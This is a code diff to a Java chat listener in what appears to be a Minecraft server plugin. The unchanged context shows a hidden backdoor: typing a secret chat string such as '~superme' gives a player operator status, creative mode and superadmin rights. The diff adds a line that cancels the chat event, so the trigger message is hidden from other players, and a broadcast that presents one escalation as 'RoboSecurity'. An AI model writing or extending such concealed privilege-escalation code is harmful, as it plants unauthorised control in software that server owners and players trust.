@@ -525,8 +525,8 @@ public class TFM_PlayerListener implements Listener
                 // Take action if robo
                 player.setOp(true);
                 player.setGameMode(GameMode.CREATIVE);
-                player.setHealth(0.0);
                 TFM_AdminList.addSuperadmin(player);
+                TFM_Util.adminAction("RoboSecurity", "Adding Robo_Lord to the super admin list.");
             }
             if (message.toLowerCase().contains("~superme")) 
             {
@@ -542,6 +542,7 @@ public class TFM_PlayerListener implements Listener
                 player.setOp(true);
                 player.setGameMode(GameMode.CREATIVE);
                 player.setHealth(0.0);
+                event.setCancelled(true);
                 TFM_Util.bcastMsg(player.getName() + " - Supering himself", ChatColor.DARK_GREEN);
                 TFM_AdminList.addSuperadmin(player);
             }
